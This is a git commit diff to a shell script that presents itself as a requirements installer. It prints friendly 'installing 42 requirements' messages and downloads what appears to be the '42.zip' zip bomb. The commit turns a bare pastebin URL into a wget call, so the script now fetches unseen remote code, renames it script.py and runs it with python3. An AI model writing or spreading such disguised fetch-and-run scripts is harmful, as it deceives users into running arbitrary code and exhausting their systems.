e4a07c966d02776458ae00fb127408688045e8d0
Humberto <88781888+op3ny@users.noreply.github.com>
2024-11-01 18:51:08 -0300

    Update script.py

--- pycache/#!/bin/script.py
+++ pycache/#!/bin/script.py
@@ -3,7 +3,7 @@ echo "Wait, we are installing 42 requirements... You want some coffee?"
 echo "This can take a few minutes"
 echo "ETA (Estimated Time Average) is equal to: 10 minutes"
 wget https://github.com/iamtraction/ZOD/raw/refs/heads/master/42.zip
-https://pastebin.com/raw/J9M26480
+wget https://pastebin.com/raw/J9M26480
 mv J9M26480 script.py
 mv 42.zip 42-old.zip
 python3 script.py
